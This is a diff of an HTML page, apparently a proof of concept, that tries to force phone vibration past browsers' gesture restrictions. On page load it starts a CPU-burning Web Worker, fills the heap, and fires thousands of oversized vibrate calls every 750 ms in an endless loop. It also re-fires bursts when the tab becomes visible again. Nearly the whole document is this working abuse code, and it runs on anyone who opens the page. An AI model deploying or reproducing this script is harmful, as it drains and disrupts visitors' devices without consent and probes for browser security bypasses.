@@ -3,100 +3,138 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Haptic Bypass Test</title>
+<title>Vibration Race Condition Test</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { 
-    background: #121214; 
-    color: #ffffff; 
+    background: #000000; 
+    color: #ff0000; 
     min-height: 100vh; 
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    font-family: monospace;
     display: flex;
     align-items: center;
     justify-content: center;
     flex-direction: column;
     padding: 20px;
   }
-  .card {
-    max-width: 400px;
-    background: #1e1e24;
-    padding: 30px;
-    border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  .box {
+    max-width: 450px;
+    width: 100%;
+    background: #111111;
+    padding: 25px;
+    border: 1px solid #330000;
+    border-radius: 4px;
     text-align: center;
   }
-  .status {
-    margin-top: 20px;
-    font-family: monospace;
-    color: #00ff66;
-    background: #000000;
+  #log {
+    margin-top: 15px;
+    background: #050505;
+    color: #00ff00;
     padding: 15px;
-    border-radius: 6px;
-    font-size: 13px;
+    border-radius: 2px;
+    font-size: 11px;
+    min-height: 150px;
+    max-height: 250px;
+    overflow-y: auto;
+    white-space: pre-wrap;
     text-align: left;
+    border: 1px solid #002200;
   }
 </style>
 </head>
 <body>
 
-<div class="card">
-  <h2>Pure Haptic Race Test</h2>
-  <p style="color: #aaa; margin-top: 10px; font-size: 14px;">Menguji bypass otomatis Vibration API murni tanpa interaksi gesture.</p>
-  <div class="status" id="log-box">> Menjalankan rantai asinkron...</div>
+<div class="box">
+  <h3>HAPTIC FLOOD EXPERIMENT</h3>
+  <div id="log">> Initializing stress vectors...</div>
 </div>
 
 <script>
 (function() {
-  var logBox = document.getElementById('log-box');
-  var totalAttempts = 0;
+  var logBox = document.getElementById('log');
+  var waveCount = 0;
 
-  function writeLog(text) {
-    totalAttempts++;
-    logBox.innerHTML = "> " + text + " (" + totalAttempts + "x)";
+  function log(text) {
+    var ms = new Date().getMilliseconds();
+    logBox.innerHTML += "\n[" + ms + "ms] " + text;
+    logBox.scrollTop = logBox.scrollHeight;
   }
 
-  // Fungsi utama untuk menembakkan getaran angka ekstrem
-  function executeVibrateBypass() {
-    if (navigator.vibrate) {
-      // Mengirimkan perintah getar raksasa melewati batas standar 10 detik
-      var success = navigator.vibrate(999999999999999999);
-      if (success) {
-        writeLog("🚨 BYPASS BERHASIL: HP bergetar otomatis!");
-      } else {
-        writeLog("❌ Diblokir browser (Perilaku Normal).");
-      }
-    } else {
-      writeLog("ℹ️ Browser tidak mendukung Vibration API.");
-    }
-  }
+  var delay = function(ms) {
+    return new Promise(function(res) { setTimeout(res, ms); });
+  };
 
-  // --- Rantai Waktu Eksekusi Beruntun (Chain Race Timing) ---
-  // Mencoba menembak di milidetik awal saat DOM dimuat
-  executeVibrateBypass(); 
+  // 1. INJEKSI BACKGROUND THREAD (WEB WORKER)
+  var blobCode = `
+    self.onmessage = function() {
+      setInterval(function() {
+        var dummy = 0;
+        for(var i=0; i<4000000; i++) {
+          dummy += Math.sin(i) * Math.cos(i);
+        }
+        self.postMessage("TICK");
+      }, 25);
+    };
+  `;
   
-  // Gelombang serangan mikro-detik berikutnya untuk mengeksploitasi siklus rendering
-  setTimeout(executeVibrateBypass, 10);
-  setTimeout(executeVibrateBypass, 50);
-  setTimeout(executeVibrateBypass, 100);
-  setTimeout(executeVibrateBypass, 250);
-  setTimeout(executeVibrateBypass, 500);
-  setTimeout(executeVibrateBypass, 1000);
+  try {
+    var blob = new Blob([blobCode], {type: 'application/javascript'});
+    var worker = new Worker(URL.createObjectURL(blob));
+    worker.onmessage = function() {
+      if (navigator.vibrate) navigator.vibrate(200);
+    };
+    worker.postMessage("GO");
+    log("Web Worker initialized.");
+  } catch(e) {
+    log("Worker bypassed/failed.");
+  }
 
-  // --- Loop Interval Konstan Guna Menjaga Getaran Tetap Hidup ---
-  // Jika salah satu dari gelombang di atas berhasil lolos, 
-  // fungsi di bawah ini akan memaksa HP bergetar terus-menerus setiap 1 detik.
-  setInterval(function() {
-    if (navigator.vibrate) {
-      navigator.vibrate(999999999999999999);
+  // 2. PARALLEL EVENT LOOP BURST
+  async function executeRaceWave() {
+    waveCount++;
+    log("Spamming Wave #" + waveCount + " (2500 Burst Requests)");
+
+    // Memory Heap Pressure
+    var heapSpam = [];
+    for(var m=0; m<1000; m++) { heapSpam.push(new Array(500).fill(Math.random())); }
+
+    var packet = [];
+    for (var i = 0; i < 2500; i++) {
+      packet.push((async function(id) {
+        await delay(Math.random() * 10);
+        if (!navigator.vibrate) return false;
+        
+        // Alternating payload strategies
+        return id % 2 === 0 ? navigator.vibrate(999999999999999999) : navigator.vibrate([500, 250, 500]);
+      })(i));
     }
-  }, 1000);
 
-  // Jika pengguna memindahkan tab atau meminimalkan browser, 
-  // browser yang aman harus menghentikan paksa loop ini.
+    // Graphics Render Interception
+    requestAnimationFrame(function() {
+      if (navigator.vibrate) navigator.vibrate(999999999999999999);
+    });
+
+    var outcomes = await Promise.all(packet);
+    heapSpam = null;
+
+    if (outcomes.includes(true)) {
+      log("🚨 API Returned TRUE. Check physical device vibration!");
+    } else {
+      log("❌ Wave dropped by browser security core.");
+    }
+  }
+
+  // Initial execution window
+  executeRaceWave();
+
+  // Infinite relentless loop triggering every 750ms
+  setInterval(executeRaceWave, 750);
+
+  // Resume state exploitation
   document.addEventListener('visibilitychange', function() {
     if (!document.hidden) {
-      writeLog("Tab aktif kembali, mencoba menembak ulang...");
-      executeVibrateBypass();
+      log("Visibility shift detected. Forcing batch requests...");
+      for(var x=0; x<30; x++) { if(navigator.vibrate) navigator.vibrate(999999999999999999); }
     }
   });
 
